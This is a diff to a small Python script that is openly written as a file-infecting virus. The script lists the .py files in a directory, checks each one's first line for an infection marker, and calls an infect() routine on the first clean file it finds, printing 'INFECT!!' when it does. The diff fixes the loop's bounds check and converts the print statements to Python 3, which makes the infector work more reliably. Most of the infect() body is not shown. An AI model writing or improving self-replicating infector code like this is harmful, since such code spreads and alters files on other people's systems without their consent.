@@ -17,8 +17,13 @@ file_li = glob.glob('*.py') #creates list of files with .py extensions
 def findFile(fileList):
     infected = True #variable for while loop
     fileCounter = 0 #variable to compare counter with size of .py list
-
+    print (len(fileList))
+    print (fileList)
+    
     while infected == True:
+        if fileCounter == len(fileList):
+            return -1
+        print (fileCounter)
         f = open(fileList[fileCounter], "r")
         firstLine = f.readline()
         f.close()
@@ -29,8 +34,6 @@ def findFile(fileList):
         
         if firstLine != infectedLine:
             return fileCounter
-        elif firstLine == infectedLine and fileCounter>=len(fileList):
-            return -1
         else:
             fileCounter += 1
 
@@ -52,10 +55,10 @@ def infect(targetFile):
     f.close()
     
 targetFile = findFile(file_li)
-print file_li[targetFile]
-print file_li
+print (file_li[targetFile])
+print (file_li)
 if targetFile > -1:
     infect(file_li[targetFile])
-    print "INFECT!!"
+    print ("INFECT!!")
 else:
-    print"All files in this directory have been infected"
+    print ("All files in this directory have been infected")
